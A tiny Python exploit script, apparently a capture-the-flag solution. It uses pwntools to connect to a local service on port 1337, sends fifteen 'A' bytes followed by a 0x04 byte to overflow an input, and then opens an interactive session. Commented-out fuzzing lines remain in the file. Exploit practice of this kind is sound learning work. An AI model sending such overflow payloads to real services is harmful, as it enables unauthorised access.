from pwn import *
from string import printable
import random

r = remote("0.0.0.0", 1337)

# def rand_char():
#     return random.choice(printable)

# for _ in range(1000):
r.send(b"A"*15 + b"\x04")
r.interactive()
